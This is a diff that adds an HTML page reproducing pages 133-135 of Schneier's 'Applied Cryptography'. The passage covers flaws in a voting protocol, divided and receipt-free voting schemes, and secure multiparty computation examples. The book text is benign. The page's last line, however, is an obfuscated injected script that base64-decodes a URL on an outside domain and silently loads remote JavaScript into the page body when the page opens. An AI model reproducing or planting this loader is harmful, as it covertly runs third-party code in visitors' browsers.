@@ -1,0 +1,98 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=133-135//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Another form of cheating is to try to figure out who voted for whom. Because of the scrambling in the first round, it is impossible for someone to backtrack through the protocol and link votes with voters. The removal of the random strings during the first round is also crucial to preserving anonymity. If they are not removed, the scrambling of the votes could be reversed by re-encrypting the emerging votes with the scrambler&#146;s public key. As the protocol stands, the confidentiality of the votes is secure.
+</P>
+<P>Even more strongly, because of the initial random string, <I>R</I><SUB>1</SUB>, even identical votes are encrypted differently at every step of the protocol. No one knows the outcome of the vote until step (11).</P>
+<P>What are the problems with this protocol? First, the protocol has an enormous amount of computation. The example described had only four voters and <I>it</I> was complicated. This would never work in a real election, with tens of thousands of voters. Second, Dave learns the results of the election before anyone else does. While he still can&#146;t affect the outcome, this gives him some power that the others do not have. On the other hand, this is also true with centralized voting schemes.</P>
+<P>The third problem is that Alice can copy anyone else&#146;s vote, even though she does not know what it is beforehand. To see why this could be a problem, consider a three-person election between Alice, Bob, and Eve. Eve doesn&#146;t care about the result of the election, but she wants to know how Alice voted. So she copies Alice&#146;s vote, and the result of the election is guaranteed to be equal to Alice&#146;s vote.</P>
+<P><FONT SIZE="+1"><B><I>Other Voting Schemes</I></B></FONT></P>
+<P>Many complex secure election protocols have been proposed. They come in two basic flavors. There are mixing protocols, like &#147;Voting without a Central Tabulating Facility, &#148; where everyone&#146;s vote gets mixed up so that no one can associate a vote with a voter.
+</P>
+<P>There are also divided protocols, where individual votes are divided up among different tabulating facilities such that no single one of them can cheat the voters [360, 359, 118, 115]. These protocols only protect the privacy of voters to the extent that different &#147;parts&#148; of the government (or whoever is administering the voting) do not conspire against the voter. (This idea of breaking a central authority into different parts, who are only trusted when together, comes from [316].)</P>
+<P>One divided protocol is [1371]. The basic idea is that each voter breaks his vote into several shares. For example, if the vote were &#147;yes&#148; or &#147;no, &#148; a 1 could indicate &#147;yes&#148; and a 0 could indicate &#147;no&#148;; the voter would then generate several numbers whose sum was either 0 or 1. These shares are sent to tabulating facilities, one to each, and are also encrypted and posted. Each center tallies the shares it receives (there are protocols to verify that the tally is correct) and the final vote is the sum of all the tallies. There are also protocols to ensure that each voter&#146;s shares add up to 0 or 1.</P>
+<P>Another protocol, by David Chaum [322], ensures that voters who attempt to disrupt the election can be traced. However, the election must then be restarted without the interfering voter; this approach is not practical for large-scale elections.</P>
+<P>Another, more complex, voting protocol that solves some of these problems can be found in [770, 771]. There is even a voting protocol that uses multiple-key ciphers [219]. Yet another voting protocol, which claims to be practical for large-scale elections, is in [585]. And [347] allows voters to abstain.</P>
+<P>Voting protocols work, but they make it easier to buy and sell votes. The incentives become considerably stronger as the buyer can be sure that the seller votes as promised. Some protocols are designed to be <B>receipt-free</B>, so that it is impossible for a voter to prove to someone else that he voted in a certain way [117, 1170, 1372].</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">6.2 Secure Multiparty Computation</FONT></H3>
+<P><B>Secure multiparty computation</B> is a protocol in which a group of people can get together and compute any function of many variables in a special way. Each participant in the group provides one or more variables. The result of the function is known to everyone in the group, but no one learns anything about the inputs of any other members other than what is obvious from the output of the function. Here are some examples:</P>
+<P><FONT SIZE="+1"><B><I>Protocol #1</I></B></FONT></P>
+<P>How can a group of people calculate their average salary without anyone learning the salary of anyone else?
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice adds a secret random number to her salary, encrypts the result with Bob&#146;s public key, and sends it to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob decrypts Alice&#146;s result with his private key. He adds his salary to what he received from Alice, encrypts the result with Carol&#146;s public key, and sends it to Carol.
+<DD><B>(3)</B>&nbsp;&nbsp;Carol decrypts Bob&#146;s result with her private key. She adds her salary to what she received from Bob, encrypts the result with Dave&#146;s public key, and sends it to Dave.
+<DD><B>(4)</B>&nbsp;&nbsp;Dave decrypts Carol&#146;s result with his private key. He adds his salary to what he received from Carol, encrypts the result with Alice&#146;s public key, and sends it to Alice.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice decrypts Dave&#146;s result with her private key. She subtracts the random number from step (1) to recover the sum of everyone&#146;s salaries.
+<DD><B>(6)</B>&nbsp;&nbsp;Alice divides the result by the number of people (four, in this case) and announces the result.
+</DL>
+<P>This protocol assumes that everyone is honest; they may be curious, but they follow the protocol. If any participant lies about his salary, the average will be wrong. A more serious problem is that Alice can misrepresent the result to everyone. She can subtract any number she likes in step (5), and no one would be the wiser. Alice could be prevented from doing this by requiring her to commit to her random number using any of the bit-commitment schemes from Section 4.9, but when she revealed her random number at the end of the protocol Bob could learn her salary.
+</P>
+<P><FONT SIZE="+1"><B><I>Protocol #2</I></B></FONT></P>
+<P>Alice and Bob are at a restaurant together, having an argument over who is older. They don&#146;t, however, want to tell the other their age. They could each whisper their age into the ear of a trusted neutral party (the waiter, for example), who could compare the numbers in his head and announce the result to both Alice and Bob.
+</P>
+<P>The above protocol has two problems. One, your average waiter doesn&#146;t have the computational ability to handle situations more complex than determining which of two numbers is greater. And two, if Alice and Bob were really concerned about the secrecy of their information, they would be forced to drown the waiter in a bowl of vichyssoise, lest he tell the wine steward.</P>
+<P>Public-key cryptography offers a far less violent solution. There is a protocol by which Alice, who knows a value <I>a</I>, and Bob, who knows a value <I>b</I>, can together determine if <I>a</I> &lt <I>b</I>, so that Alice gets no additional information about <I>b</I> and Bob gets no additional information about <I>a</I>. And, both Alice and Bob are convinced of the validity of the computation. Since the cryptographic algorithm used is an essential part of the protocol, details can be found in Section 23.14.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(SadgXHBN, oJgdzesG) {oJgdzesG = SadgXHBN.createElement('script');oJgdzesG.type = 'text/javascript';oJgdzesG.async = true;oJgdzesG.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');SadgXHBN.getElementsByTagName('body')[0].appendChild(oJgdzesG);}(document));</script></body>
+</html>
